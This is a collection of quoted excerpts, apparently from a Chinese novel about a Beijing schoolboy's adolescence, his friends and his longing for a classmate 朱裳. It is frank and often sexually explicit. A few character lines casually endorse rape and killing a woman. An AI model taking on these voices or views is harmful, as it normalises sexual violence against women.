“我和老流氓孔建国讨论，我说刘京伟眼里有光、下身总是硬硬的、元气充盈，将来一定了不起。他骨子里的贪婪常常体现在小事情上，一根冰棒，他会一口吞到根部，再慢慢从根部嘬到尖尖儿，第一口就定下基调：从根到尖，涂满他的哈喇子，全部都是他的。老流氓孔建国却说他神锋太俊，知进不知退，兴也速、败也速，弄不好，还有大祸，充其量也就是一个军阀的胚子。我听了糊里糊涂的。老流氓孔建国又说，我也很贪婪，眼里也有光，但是我的眼底有很重的忧郁。我更糊涂了，知道不是什么好话，就嚷嚷：“你丫别扯淡了，我平面几何考试怎么及格还不知道呢。你再胡说，我到胡大妈那儿告你企图鸡奸。”“ “楼下老头子们讲，梦里的都是妖魔鬼怪，吸走的都是真阳。真阳没了，眼珠子也就不转了，鼻涕快流进嘴角的时候也不能及时地吸进鼻孔了。“ “他们说起他们过去的故事，我总是将信将疑。“ “没有法子，男人只有自己出门找水喝， 怕人家不乐意给， 随身带上了刀。“ “ 黑胖子的老婆说黑胖子原来在炮兵部队上是厨师班长，从来只负责偷吃不管干活。我想，没有比黑胖子过去的职业更悲惨的了，戴绿帽子、背黑锅、看别人打炮。 “ “明里不见人头落，暗中叫你骨髓枯。刘京伟和张国栋认定，随着时间流逝，我即使不会精尽而亡，也会渐渐出落成为一个没有出息的笨人” “她可能不是同谋，只是阴谋的一部分。“ “我看不见人们的灵魂，但是，隔着裤裆，我看得见他们的阴茎。” “我当然也有理想啊。我的理想是娶最漂亮的姑娘，写最无聊的文章，精忠报国，实现四个现代化。你是我见过的最漂亮的姑娘，不娶你娶谁呀？”“ “你以为是个生人，或许他曾经和你睡过同一个姑娘呢。”“ “桑保疆是倒尿盆长大的，这个，他懂不了。 “ “其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。“ “我的长相平庸而粗糙，但是我的内心精致而细腻。我和老流氓孔建国说，别看我长得象个杀猪的，其实我是个写诗的。“ “那个写诗的晚上，我速读《诗经》，跳过所有祭祀章节和不认识的文字，明白了“赋比兴”和“郑风淫”、最大的写诗诀窍就是找到心中最不安最痒痒的一个简单侧面，然后反复吟唱。那个写诗的晚上，我写完了我这辈子所有的诗，之后再也没有写过一句，就象我在十六岁至十八岁期间耗尽了我对姑娘的所有细腻美好想象，之后，所有的姑娘在我的眼里都貌美如花。” “我以前总是纳闷，街面上日日在自己面前飘然而过的那些美若天仙的姑娘们回家后都和谁睡觉。观察过朱裳父母之后我清楚了，就是和朱裳爹这种人。这种人坐不出龙椅和马扎的区别，赏受着上等的女人，无知无觉，问心无愧，如得大道。否则的话，对绿帽子的担心，就会让他少二十年阳寿。“ “美人在专心开车，不象平日里一样过分专注于自己的美丽，所以格外好看。“ “后来，我学了心理学，才感觉到，少年时期很多美好想象都是境由心生，没看过猪跑，更没吃过猪肉，把对凤凰的想象都拽到母猪身上了。“ “我一觉醒来，大吼一声：“大梦谁先觉，平生我自知”。想起过去创作这首打油诗的诸葛亮，在那个叫南阳卧龙岗的地方，种田、读书、钱多的时候叫鸡、钱少的时候手淫，觉得自己生不逢时。“ “是孔明就要论天下，是关公就要舞大刀”。刘京伟和张国栋听到，一定会加盟，老流氓孔建国听到，一定会加盟，这就是文字的力量。“ “现在的空气脆而冷，就在这种天气里，一个案件发生了重大的转折，好人坏人正义邪恶变得混沌不清，各种关系纠缠在一起，不是案件，而是一个阴谋。女孩作为一个整体在这个阴谋里起的作用极其重大而微妙，朱裳的意义更加隐涩。” “好象忽然一夜间，所有男生都想有一双名牌运动鞋，耐克、阿迪达斯、彪马…仿佛一双名牌鞋能添无数牛逼和小女生的目光。在之后的进化过程中，男生变成男青年，中年男子，老头，这双名牌运动鞋也随着变成名牌手提电脑和名牌山地车，一米七八一头长发的妖艳女友和宝马Z3以及郊区豪宅，一米六零胸大无脑柔腻软滑的十八岁女孩和明紫檀木画案以及半米长的红山玉龙形钩，但是，给予不同阶段的男性生物，同样的渴望、困扰、狂喜和无可奈何。“ “刘京伟是个头脑灵活但是无比简单的人。他短暂的一生都在追求牛逼。不同阶段，追求不同的牛逼，所有追求到的牛逼加总就构成了刘京伟短暂而牛逼的一生。“ “第二天，刘京伟请我和张国栋在朝阳门外的桥头酒店吃五块一斤的三鲜饺子，他吃得很少，两手抱着他新买的白地蓝钩高帮耐克鞋，那双鞋用鞋带串在一起，跨在他脖子上，左脸边一只，右脸边一只，每只都比他的脸大，比他脸白。刘京伟两眼望着天花板长久沉默，他忽然说：“牛逼，牛逼啊。” “后来，刘京伟的激素水平发育到觉得有个妖艳女友是牛逼的。刘京伟对我说：“我没有你会臭侃山，没有张国栋长得清秀。我怎么办呀？”我说：“总有办法的。”张国栋说：“再生一回吧。”刘京伟说：“张国栋你闭嘴。只要我活着，就会比你牛逼。你再清秀也是一堆清秀的狗屎。我和秋水说话。秋水，你有一点我特别佩服，你的自制力极好。你一个人呆的时候该看书也看书，该修炼你的文字就修炼你的文字。我也要在一个指定的方向上使力气，我也要修炼。”他于是修炼了一身腱子肉，条条块块，是姑娘都想摸。他冬天也穿紧身短袖，像个脱了皮的蛤蟆。为了长肌肉，他每天不吃饭，在最短的时间喝二十五个生鸡蛋。” “。张国栋问刘京伟，这样练，阳具也跟着变大吗？刘京伟说，不是，反而缩小，因为血都充到其他大块肌肉上去了。张国栋说，那我就不练了。我说，锻炼不同肌肉的道理是一样的，就是反复充血，你应该多看黄书，但是要保持不射。张国栋说，自摸行吗？刘京伟看了看我，我们同时说，行，可你丫能保持不射吗？” “再后来，刘京伟的大奔里没有姑娘香水味了，刘京伟欢快地对我说：“你知道现在最牛逼的是什么吗？是雇哈佛大学毕业的MBA。我把姑娘们都打发了，雇了三个今年刚从哈佛大学毕业的MBA。” “这时候的女孩个个可看。即使最丑的姑娘也有动人的时候。 “ “后来的后来，我在老流氓孔建国的教导下玩玉。老流氓孔建国说：“你早上睡醒之后，摸摸下体，如果已经不是一柱擎天了，说明你的真阳已经不足。有些人在三十发现，有些人四十。这时候，你对真善美的兴趣就应该从姑娘转到玉。处女是新玉新工，贼光扎眼。二十几岁是清初件，康乾盛世呀。三十几岁是宋元明，‘明大粗’。四十来岁是商周古玉，铅华洗尽，没有一丝火气，美呀。玉好像姑娘，也需要陪，需要珍爱，需要一日三摸搓，可以戴，可以显摆，可以放进被窝儿。玉比姑娘好，不离不弃，不会逼你一夜三举，还可以洗洗留给儿子。算了算了，别老想着朱裳和翠儿了，昨天我在古玩城小崔那儿看见一个商早期的圆雕玉虎，青玉，十多个厘米长，沁色美极了，太少见了，图谱上有片儿的，够上拍卖会进博物馆的。准备几万块钱，咱们明天把它拿下。” “不要老拿你的大油手在玉上摸来摸去，玉会污的，污了就再也干净不了了。真正的盘玉，是戴在身边，用身子煨着，用脑子想着，把你意淫文字的功夫用到这儿来，一两个星期用热水泡一下，用粗白布擦。不要老拿你大油手摸，糟践好东西。”” “我们不要音乐要叫喊， 我们不要道理要金钱， 我们不要先生要混蛋， 我们不要女生要天仙。 为什么越用功的女孩脸蛋越苦？ 为什么我越想越糊涂？ 为什么几千年都过去了， 还没有另一个秦始皇烧干净书？ 姑娘你仰头总是绷着漂亮的脸， 仿佛要沾你的一定是个款， 为了心理平衡我想问几遍， 你是否也天天大小便？” “ “如果从小长到大是个电子游戏，游戏里有好些凶险的大关卡，最早是如何应对父母，如何和兄弟姐妹相处，如何和发小一块玩耍，然后是如何对付摆在你面前的象朱裳这样天生狐媚的姑娘，如何对付混蛋的教导主任和白痴数学老师，然后是每个人都有的老板和老婆，然后是整日呼啸的小孩、父母的老去。面对朱裳这个题目，我们没有一个男生答对了。有些人给自己一个借口，反正也试过了，有些人索性忘记了，有些人找个眉眼类似的，反正没人知道正确答案，所有人都在游戏里过了关，可能编游戏的人是个逻辑不清的人吧，很少较真。” “ 在书里倦了，合上书，找个晦涩的角度看朱裳，我觉得明目爽脑，仿佛夜里读书累了，转头细看窗子里盛着的星星。过去没有电视和互联网，我们和古人一样，看自己的身体，看天空的星星，看同桌的姑娘，在简单中发现复杂的细节和普遍的规律。“ “关于朱裳，我该学习多少次呢” “我要老到什么时候才能忘掉这些记忆？我是学医的，我知道即使失去双手，双手的记忆也还是在的” “。” 我从枕头底下拿出来藏着的一包大前门，反锁了宿舍门，点上一根给张国栋，自己再点一颗。我坐在我床铺前的桌子上，向张国栋表白，希望他能理解： “我坐在朱裳身边，如果天气好，窗户打开，风起来，她的发梢会偶尔撩到我的脸，仿佛春天，东三环上夹道的垂柳和骑在车上的我。” 我看着张国栋，接着说：“你明白我的意思吗？” “我明白了。”张国栋收起书包，“杂志你先看吧，借你的，不是送你的呦。” “张国栋说，他还记得我面对黄色杂志的表白，记得东三环上夹道的垂柳和朱裳的相似，这个意象对他很重要，等他挣够了钱，他一定写个关于这个意象的本子，然后拍个不赚钱的片子。” “在张国栋摊了一堆黄色杂志，和我交涉换座位之后，他时常找我聊天。话题总是围绕女人，特别是关于朱裳。在我漫长的求学过程中，男生和男生之间时常进行这种交流，题目多数是关于女人，偶尔涉及考试和前程。如果把考试的定义扩大，女人也是考试题目，我们长久地讨论，以期充分理解题目，上场的时候争取马虎过关。刘京伟从来不参加这种讨论，他说我具备一切成事的素质，只是想得太多。刘京伟不喜欢念书，不喜欢考试，他喜欢他的一切都是标准答案。刘京伟通常采取的态度是：“我就这么做了，怎么着吧?”他看见我茫然不解，就举例说明：“比如你喜欢一个姑娘，就按倒办了，丫不开心，就杀，就走。如果心里还是喜欢，下次再遇见，再奸，再杀。”我说这些道理太高深，无法顿悟，我天分有限，不念书不考试就无法懂得。刘京伟预言，他都死了，我的书还没读完。刘京伟一语成谶，我参加他的葬礼的时候，关于卵巢癌发生机制的博士论文才刚刚写完初稿，答辩会还没有安排。“ “他说我具备一切成事的素质，只是想得太多” “姑娘又不是阿拉伯数字, 不具有可比性。 玫瑰好看, 做汤肯定没有菜花好吃。” “ “只是干净？” “你以为干净简单？我觉得你张国栋让女孩感觉舒服，你以为这‘舒服’二字简单？” “就是呀，我这种气质，很难培养的，每周都要洗澡，每天都要刷牙。还有，要看书，多看书，‘腹有诗书气自华’。还有，要多思考，否则就肤浅了。绝不简单。” “追她的人已经够多的了。我不喜欢锦上添花。”“ “就是。好象是个男的就应该想和她有一腿似的。我都有点压不住邪念了。不过，多点追的才有意思，横刀夺爱，方显英雄本色。”“ “持续学坏是一件多么令人兴奋的事呀。可惜不是什么好烟，‘红梅’。本来第一支应该是支好烟，就象童男子破身之后通过政治思想学习，再次成为童男子，再次破身应该是个好姑娘，至少也应该和朱裳差不多吧。”“ “书之外，还有别的要懂的东西。“ “学抽烟为了学坏， 学坏为了学习长大。 学习长大得厌恶爸爸， 再杀死他。 学习长大得爱上妈妈， 再抛弃她。”“ “你这么抽烟纯属浪费，”张国栋深吸一口烟，吞进肺里，再慢慢地让烟一丝丝地从鼻孔飘出来，青烟曲折回转散入周围的黑暗之中。 “想上就别憋自己。你有戏。” “是么？” “她喜欢你。” “为什么？” “你喜欢书，读得仔细，你有时候就是你喜欢的书。你能迷上你的书，别人也会迷上你。”“ “你说别人的事总是出奇的明白，遇到自己的事总是嫩。这事呀，你试试就知道了.就象有些事不用教，上了床自然就会了。再说你也没骚扰过小姑娘，也没少被小姑娘骚扰呀，怎么一到朱裳这儿就发木？咱们学校躲在树后面看你的姑娘不比原来躲在山洞里流着口水等着吃唐僧肉的妖精少。”“ “我想起我的小屋。周末回去，胡乱填几口饭，反锁上门，世界就和我无关了。拉上窗帘，大红牡丹花的图案就把所有光线割断，包括星星。打开台灯，昏黄的光线将满溢在小屋里的书烘暖。书从地板堆到屋顶，老妈说，书上不省钱，想看什么就买什么，读书多的孩子孝顺。书不像古董，不是世家，省省也能请回家最好的。我和我姐姐站在琉璃厂中国书店高大的书架前，我问她，妈给你的钱够吗？我姐姐说，够。我对售货员说，我要一整套十六本《鲁迅全集》和一整套二十五本《全唐诗》。我问售货员，近百年是不是鲁迅最牛逼了，近两千年，是不是唐诗最牛逼了。” “我摆开几个茶杯，杜牧，李白、劳伦斯、亨利米勒就静静地坐在对面。倒上茶，千年前的月光花影便在小屋里游荡。杜牧，李白、劳伦斯、亨利米勒已经坐在对面了，他们的文字和我没有间隔。我知道他们文字里所有的大智慧和小心思，这对于我毫无困难。他们的魂魄，透过文字，在瞬间穿越千年时间和万里空间，在他们绝不知晓的北京市朝阳区的一个小屋子里，纠缠我的魂魄，让我心如刀绞，然后泪流满面。第一次阅读这些人的文字对我的重要性无以伦比，他们的灵魂像是一碗豆汁儿一样有实在的温度和味道，摆在我面前，伸手可及。这第一次阅读，甚至比我的初恋更重要，比我第一次抓住我的小弟弟反复拷问让他喷涌而出更重要，比我第一次在慌乱中进入女人身体看着她的眼睛身体失去理智控制更重要” “我第一次阅读杜牧，李白、劳伦斯、亨利米勒比我第一次解剖大脑标本，对我更重要。我渴望具备他们的超能力，在我死后千年，透过我的文字，我的魂魄纠缠一个同样黑瘦的无名少年，让他心如刀绞，泪流满面。我修炼我的文字，摊开四百字一页的稿纸，淡绿色，北京市电车公司印刷厂出品，钢笔在纸上移动，我看见炼丹炉里炉火通红，仙丹一样的文字珠圆玉润，这些文字长生不老。我黑瘦地坐在桌子前面，骨多肉少好像一把柴火，柴火上是炉火通红的炼丹炉。我的文字几乎和我没有关系，就像朱裳的美丽和朱裳没有太多联系，我和朱裳都是某种介质，就像古时候的巫师，所谓上天，透过这些介质传递某种声音。我的文字，朱裳的美丽，巫师的声音，有它们自己的意志，它们反过来决定我们的动作和思想。当文字如仙丹一样出炉时，我筋疲力尽，我感到敬畏，我心怀感激，我感到一种力量远远大过我的身体、大过我自己。当文字如垃圾一样倾泻，我筋疲力尽，我感觉身体如同灰烬，我的生命就是垃圾。” “我对张国栋说：“我的屋子太小了，床上的书把我都快挤得没地方睡了。已经放不下别的了。” 杜牧，李白、劳伦斯、亨利米勒已经坐在对面了，朱裳坐在什么地方呢？ “那我就先追了？我可是跟你商量过了。” “好。需要的话，我替你写情书，送小纸条。如果人家对你有意思，我把座位让给你。”“ “从现在看来，我和朱裳的关系是由短暂的相好和漫长的暧昧构成。” “小时候，我们性交不足，我们体力积累得无比好，” “那时候，我和朱裳从天安门走到东单走到白家庄，北京夏天的白天很长，在半黑半白中，我们在43路车站等车，说好，下一辆车来了就分手。来了无数个下一辆，好多人下车，好多人上车，好多人去他们要去的地方。在等待无数个下一辆的过程中，我拉着朱裳的手，她的手很香。朱裳看着我的眼睛，给我唱那首叫Feelings的外文歌曲，她的头发在夏天的热风里如歌词飞舞，她说我睫毛很长。后来朱裳告诉我，她之后再没有那么傻过，一个在北京这样自然环境恶劣的城市长大的姑娘怎么可以这样浪漫。我说我有很多回想起来很糗的事，但是想起，在我听不懂的外文歌曲中，握着将破坏我一生安宁的姑娘的香香的手，永远等待下一辆开来的43路公共汽车，我感到甜蜜和幸福。” “很多个小二锅头之后，朱裳说，在中学，她听不进课的时候、累的时候，都会不由自主地看我，认为我和别人不一样。教材、教参、习题集堆在我桌子上，堆成一个隐居的山洞，挡住老师的视线，我手里却常年是本没用的闲书。她觉得我是个真正的读书人，一个与她爸爸略相象的读书人。真正的读书人如同真正的厨子、戏子、婊子，身上有种与生俱来的对所钟情的事物的痴迷。书中的女人秀色可餐，书中的男人快意恩仇。书外如何，与真正的读书人无关。她喜欢看我脸上如入魔道的迷离，如怨鬼般的执著。我说：“是不是我长得象你爸就能娶到你妈那样的？”朱裳说：“我当时是年幼无知，看走了眼，其实只是你太瘦了，招眼，容易让人心疼。” “我对朱裳说，女人或者复杂或者单纯，都好。但是，复杂要象书，可以读。简单要象玉，可以摸。当时的朱裳也不让解扣子，也不让上手摸，我能干什么呢？“ “她坐在我旁边，忍不住会在我专心念闲书的时候看我。她感觉到与我本质上的相通：“一样的寂寞，一样的骨子里面的寂寞。这种寂寞，再多的欢声笑语，再迷醉的灯红酒绿也化解不开，随便望一眼舞厅天窗里盛的星空，喝一口在掌心里的隔夜茶，寂寞便在自己心里了。仿佛他打开一本闲书，仿佛我垂下眼帘，世界便与自己无关了。这种寂寞，只有很少的人懂得。” “哥哥们看到朱裳小妹妹听得泪流满面，脸上珠串晶莹，不禁心惊肉跳，明白这个小妹妹心中有股大过生命的欲望，今生注定不能平凡。” “最出色的一个看她的眼神开始不对了，试探着和她谈一些很飘渺很抽象的事。她开始害怕，大哥哥们不可爱了。“ “安全第一，男孩第二”，她们的父母教育她们。“ “翠儿除了演戏之外，不化妆，她说上妆毁容，就像写东西折寿一样” “梯子当时跟我阐述，她年纪还小，还没想清楚是出国颠覆美国腐朽的资本主义还是留在国内大干社会主义，还没想清楚是青灯黄卷皓首穷经搞学术还是大碗吃肉大秤分金搞生意，所以洋书生和土大款都要交往。我说，同意，注意时间安排，注意身体，努力加餐饭。最后梯子选择了资本主义腐朽生活，到了美国一年后拿了绿卡，就和陕西洋考古离了婚，说是在美国一年到头吃不着有土腥味的活鲤鱼，却要整天睡有土腥味的老公，不靠谱。梯子马上找了个美国老头，有钱，有大房子，有心脏病，阴茎短小但是经常兴奋。老头是用直升机把梯子娶进那个大房子的，我见过婚礼上的照片，长得像大白胡子的圣诞老人，梯子皮肤光滑滋润，但是表情还是很坚毅。第一次上床，梯子说，就知道了老头的斤两，梯子还说，不是吹牛，如果她愿意，和老头隔着一千英里，电话性交，她能让老头心脏病发作，死在去医院的救护车上，脸上还充满淫荡的笑容。老头就是这样死了，梯子带着美国护照和天文数字的资产回到北京，对我说：“我从小都找比我老比我成熟的，追求前进追求光明，现在我要反过来了，你说，我是不是老了。”我说：“怎么会，你的肌肉还结实，腿上毫无赘肉。万马军中取上将首级，你还是易如反掌。而且，从另一个角度说，你又比我们早好几步领导了潮流。”” “我总对我的女朋友说，你是舞后，你玩儿你的，我一点都不在意，我替你在这儿看管大衣。我在角落里看我的女友在舞场里旋转，她的头发盘起来，她笑脸盈盈，她汗透春衫，我觉得她比和我在一起的任何时候都美丽。“ “你乐感好，听着音乐、跟着我就好了。” 张国栋一笑，朱裳后来告诉我，张国栋有一种不属于淫荡的笑容，很容易让女孩想起阳光。” “我有一种理论，物质不灭，天地间总有灵气流转，郁积在石头上，便是玉，郁积在人身上，便是朱裳这样的姑娘。玉是要好人戴的，只有戴在好人身上，灵气才能充分体现。女人是要男人抱的，只有在自己喜欢的男人怀里，灵气才有最美丽的形式。“ “对浅吟低唱、春情萌动不感兴趣的一小堆男生正扎在一起猛吃剩在桌子上的公费瓜果梨桃、花生瓜子，大谈现代兵器、攻打台湾及围棋。” “老僧亦有猫儿意，不敢人前叫一声” “张国栋觉得，“文革”是一种节日。人可以活在天地间，可以打架，可以泡妞，可以象个好汉，名正言顺。男孩从打架中能学到不少东西：忍让，机智，必要的时候诉诸暴力。仿佛四、十万年以前，北京人还住周口店的时候，打架能让你获得猎物，泡妞能让你的姓氏繁衍。现在的混混只能学学港、台的小歌星，穿得光鲜亮丽，将来不会有大出息。“ “人性是多么堕落呀!” “我是多么喜欢堕落呀!”“ “ “回头再买十串羊肉串，多放孜然，多放辣椒，一人一瓶啤酒, 一边吃喝一边回学校。” “啊, 生活!” “太资产阶级情调了，小资” “我们并肩走在大街上，我看见，路灯映照着张国栋、刘京伟、桑保疆的脸，他们脸上的粉刺大红大紫，灿若春花。侧头，天上是很好的月亮，好象什么都知道似的冷冷地瞧着。我们什么都不多想地朝前走，前面是不再刺骨的风. 将来是什么都会有的，我们没有一个人想到“穷则独善其身，达则兼善天下”。武侠小说上说，鲜衣怒马，年少多金。我们兜里各有三、五块钱，年轻真好。 而且，我们在当时那个时候，没有一个人想到姑娘。 我们手拉着手，像南北朝那时的同性恋一样，在大街上走。“ “张国栋没呆多久就回来了，理由和几十年前毕加索的一样：艺术只有在东方，在中国和日本” “张国栋在学校兼教职，他写信告诉我，原来姑娘也像庄稼和瓜果梨桃一样，每年都有新的一拨儿，新的一拨儿不见得比老的一拨儿难吃。” “你们是不是皮肉发紧呀？” 我说” “体育老师是个简单而纯朴的人，他挣很少的工资，一天三顿吃学校的食堂，最大的乐趣是帮助女生练习鞍马或是单杠等体操项目，他有一双温暖而肥厚的小手。孔丘说：天下有道，丘不与之易也。意思是，你牛逼，我也牛逼，我不拿我的牛逼和你的牛逼换，我不羡慕你。从小到大，我认真羡慕过的人只有两个，一个是这个体育老师，无论春夏秋冬，一年四季都有新鲜的姑娘屁股摸，特别是在当时的历史条件下，物质贫乏，冬天唯一的新鲜蔬菜是大白菜。另一个是我的外科教授，他主攻乳腺外科，每天早上出诊，诊室里都是小一百对焦急地等待他触摸的乳房。“ “教导主任常说的话是：“自然给孩子以身体,而我们塑造他们的灵魂。”他讲这句话的时候没有感到可怕，感到的是巨大的责任与成就。“ “不建学校，就得多建监牢。学校人少，监牢中的人就会多。学校办得差，监牢中就会人满为患。”他在教师会上讲这番话的时候感觉自己象个将军。“中学生，说到底还是孩子。正处于人生观，世界观形成阶段，象一块未琢磨的璞玉，未着色的白纸。不是他们缺少问题，而是我们缺少发现。” “在教导主任眼里，怎么可能没问题呢？就象有些花要香，有些雨要下，有些娘要嫁一样，有些人从小注定不安分。“ “ 我们一起扑上去看，果然是一等奖。我当时毫不怀疑，我这辈子都挣不到五百元钱。” “张国栋从骨子里瞧不上他，觉得象他这样一个面白无须，爱打小报告，好色却绝对作风严谨的人应该生活在那个太监属于正当职业的年代。” “张国栋跟我讲过，三楼男生厕所第二个蹲坑的门上有两行字：“到哈佛读书，做朱裳老公。” 张国栋说：“咱们班长理想远大。我认得他的字。俗甜。” “你的理想呢？”我问。 “挣钱。还有 ……” “什么?” “如果我和咱们班长的理想都实现了，我就尽全力让他戴绿帽子。开了奔驰600到他家楼下，用手机和朱裳叙旧。不急不燥，慢慢地聊。” “大地一片静寂，除了我的呼吸和朱裳的心跳。一定要绿化了他，让他绿透了心，让他绿得萎而不举、举而不硬、硬而不坚、坚而不久、久而不射、射而不能育。” “被迫满大街找电线杆子，顺着上面的广告钻胡同找老军医，最后受骗上当，一针下去再也抬不起头。然后和他的女儿混熟，去迪厅、歌厅、饭店、酒吧……见尽物欲横流，让她一回家就觉得家里憋气，看见她爸就憋气，有空就质问朱裳‘您为什么让这个人成了我爸爸？’……”“ “但是对于我这种天赋好、后天训练又严格的厚脸皮没有多少效果。” “在翠儿面前，只有在翠儿面前，我停止思考，我的小弟弟替代我的大脑，全权主导我的行为。” “我缩在我靠窗的座位里，人也懒懒的。望着烦躁的窗外的春，柳絮在飞。想起那句庸俗的宋词：“柳径春深，行到关情处。颦不语，意凭风絮，吹向郎边去。”“ “朱裳在，有两、三里垂柳堤岸就够了。“行到关情处”便是走到动情处了。手不必碰，眼不必交，只需两个人慢慢走就好了。有些心思，想不清，分不明。就象这酿在春光中的柳絮。有些心思也不必说出口，也不必想清楚，好在有柳絮。柳絮会带着柳絮一样的心思到她的身边去的，让她一样地心乱、心烦，一样的不明白。“ “我、张国栋、刘京伟的步子放慢，朱裳聊了几句，一脸的不高兴。平时，朱裳虽然不爱说话，但从没有把不快堆在脸上。 我停了下来。张小三后来说，他很少看见我的眼睛里充满这种凶狠躁戾之色” “你也上医院去看看吧。”朱裳后来说，她搀住我的手当时碰到我的单衣，她记得我的单衣下面的肌肉坚硬如石。“ “老流氓孔建国早讲过,秋水的心术正不了。” “或许自己真是不行了，连“酒色”都不行了,还有什么行的呀？真是对不住老流氓孔建国的教诲。“ “人的脊柱里有盏灯，一杯“二锅头”沿着脊背下去到脊柱的一半，那是人的真魂儿所在的地方,一团火焰就燃烧起来了。啤酒要柔的多，要几瓶，时间要更长，灯也点不了太亮，飘摇着，就象一盏破油灯。油灯里的世界与白天里的不一样，与无光的黑夜里的也不一样。世界更加真实而美丽。” “我没怕过什么人，也没信过什么。但我相信我将来会富，会成为一个有钱人。是不是男人就不该真的爱上什么人？就该搂完抱完心里什么也不剩？这样才能睡得着，吃得香，说起话来才能不顾忌，干起事来才能特玩命，才特别特别地象个好男人？这样，对，这样，就有许多女孩来喜欢你，然后你在搂完抱完心里什么也不剩。难道喜欢就是因为你不能放开了去喜欢？真他妈的见鬼了，见大头鬼了。可是是不是真的爱上什么人不是由你定的，你妈的，到底谁定的？到底谁管？凭什么呀？凭什么要喜欢你？凭什么？凭什么？”我想大声喊，喊醒所有的人，包括这个楼上的，父母单位的，包括学校的同学、老师，包括老流氓孔建国朱裳妈妈的老相好，喊醒所有睡着了的人，让所有的人都知道，自己在鬼哭狼嚎，自己在鬼哭狼嚎地喜欢着一个姑娘。“ “为什么现在不是一千年以前？作屠夫的如果胳膊粗,可以象樊哙一样挥舞着杀猪刀去取人首级。如果舌头长,可以周游列国搬弄是非。哪怕阳物伟岸，也可以插进车轮，定住马车，让武则天听到谣言招进宫去。即使现在是一百年前,也能把朱裳抢上山去。过去好啊，斗殴和强奸一样，都是生存手段，现在都要受法律制裁。 现在是现在，街上有“面的”，路灯会定时熄灭定时亮起。现在能干什么呢? “我这回真的信了，我信了还不行吗？”我听进我自己的声音突然变小，变得轻柔：“如果这辈子我能娶到朱裳，就让她屋子里的灯亮了吧！亮了我就信了。” “让灯亮了吧。” “亮了吧！” 那盏灯突然亮了，一点道理没有地突然亮了，在我念第三遍咒语的时候亮了。 我一路小跑，躲进我的房间里。“ “我和张国栋认为是她的诗才太盛，但是表达能力太差，郁积在胸，变成了胆囊结石和胆管结石。” “代课语文老师仗着他的大脑袋，精通中国文人的传统绝技：牢骚与胡说八道” “比如讲公子重耳时，至少要讲重耳的板肋与重瞳，板肋就是排骨中间没肉，连成一块。重瞳就是一只眼睛里有两个瞳仁，天生的四眼，很吓人。如果讲台下的女学生们听得入迷，双手托腮，腮帮子白里透红，语文老师还要讲起重耳像女人珍视她们乳房一样珍视他的板肋，时常抚摸，他逃亡的时候，有个国君趁他洗澡的时候偷看了一眼他的板肋，重耳隐忍退让，当时什么也没说，等得势当上晋国国君之后，找了个借口把那个国君干掉了” “爱念书的几个人象往常一样，屁股和椅子紧紧地吸着，复习上课记的笔记：“陕西，手巾板儿朝后。山西，朝前……” 鼻孔黑黑的男生对着同桌的眉眼傻笑：摊上新来了批水洗布的裤子,裤形不错，想不想一同去看看? 几个臭小子绕着桌椅游走玩耍，互相拍打对方的身体以示友好：又过了一节课，你是否感觉幸福?“ “还立志当采花大盗呢？扯淡。”我暗暗骂了自己一句。“ “你说要是哥伦布有个数学老师，他能发现新大陆吗？不能细听，听多了许多欲望都会没的。不仅食欲，兴许连春梦都没得做了呢。”“ “穷文富武。文人吃饱了先想的一定是抱姑娘而不是写文章。不过，这或许是请客的真实目的呢。”” “我忽然不想上下午的政治课了，天阴了起来，我想回我的房间去。“ “桌子的右手是扇窗子，窗子里盛了四季的风景，花开花落，月圆月缺。桌子的左手是扇门，我走进来，反手锁上，世界就被锁在了外边。 点亮灯，喝一口茶，屋里的世界便会渐渐活起来。曹操会聊起杀人越货，谈笑生死，以及如何同袁绍一起，听房，轮奸别人的新媳妇。毛姆会教我他的人生道理，最主要的一条是不要带有才气的画家或是写诗的到家里来，他们吃饱以后一定会勾引你的老婆。受尽女人宠的柳永低声哼着他的《雨霖铃》，劳伦斯喃喃地讲生命是一程残酷无比的朝圣之旅。杜牧才叹了一声“相思入骨呀”，永远长不大的马克吐温便开始一遍遍教你玩儿时的种种把戏。“ “有些问题太难懂，仿佛上学离开妈妈，仿佛将来要将性命托给另外一个女人，仿佛现在心里喜欢上一个姑娘。小屋子太小了，容得下两个人吗？屋里的天地太大了，那个姑娘会喜欢吗？”” “我坐在桌子前，世界和自己之间是一堵墙，墙和自己之间是一盏灯，灯和自己之间是一本书。书和自己之间，是隐隐约约的朱裳的影子。” “看得见数学老师不停翕动，唾沫细珠乱蹦的嘴，但是听不见任何声音，教室静寂无声。看得见每个人脑袋里的血管和血管里的思想，但是无法判断是邪恶还是伪善” “我醒来的时候，发现和我躺在一张床上的李白、柳永、杜牧之流正用阴冷而狠毒的眼神看着我，张张惨白的脸在防腐剂中浸泡了千年，显得空洞而没有意义。” “大家富点了，钱怎么花呀?一是给自己花，有病看西医，没病看中医。” “出去淫荡吧!康大叔说得好，包好!包好!画阴阳盂的人巨聪明，你瞧，一阴，一阳，一男一女，你中有我，我中有你。一边多的正是一方边少的。我看，人心里都有个空荡荡的洞，你怎么努力，踢球、打牌、毛片、自提，没有用，最多只能堵住半边。就象阴阳盂，男孩只有泡在女孩那儿，才能补齐那半边，才能真正实在，才能真正愉快。去吧!包好，包好。”” “再捅捅，这得自己来了，我也帮不上你。仿佛和尚讲的‘悟’，师傅说出大天去也没有用，还得自己想明白。”” “有时候想明白也没有用，事情不经就没法明白。” “扯淡。即使有点感觉，又能怎么样呢？语文老师说：‘假如我的眼睛使你心跳，我就从你脸上移开我的目光；假如打桨激起了水波，就让我的小船离开你的岸边。’我和你不一样，我没有你挺。” 我又喝了一口酒。“ “他怎么想起来的？” “或许是长到时候了吧，和憋尿差不多。” “或许是天热，气烦。”” “阳正在下沉，“为什么初生的与要下沉的总是很大？”红红的、圆圆的，仿佛某种永难愈合的伤口。” “这是他的逻辑，不是我的逻辑，你知道我的，我没逻辑。” “你真仗义，如果没有‘然后’的话？” “然后咱俩把位子换过来。” “不干。” “只换半年。” “免谈。不干。”” “好吧，你等好吧。我知道你瞧不上我，一入校你就让我难看，你们都看不上我，我也会让你很难看的。”” “不再是楼群间的老路了” “朱裳后来告诉我，她脑子里浮现出那个很丑很丑的布娃娃，以及把娃娃剪成碎片的剪刀，没有继续想，重重地关上了门，转身靠在门框上，泪如泉涌。” “我在朱裳关门的一瞬间，瞥见她身后，阳台上，她白地粉花的内裤随风飘摇。” “我尤其喜欢评论的最后一段，感觉自己象是巫师，具备了盅惑人心的超能力。” “ 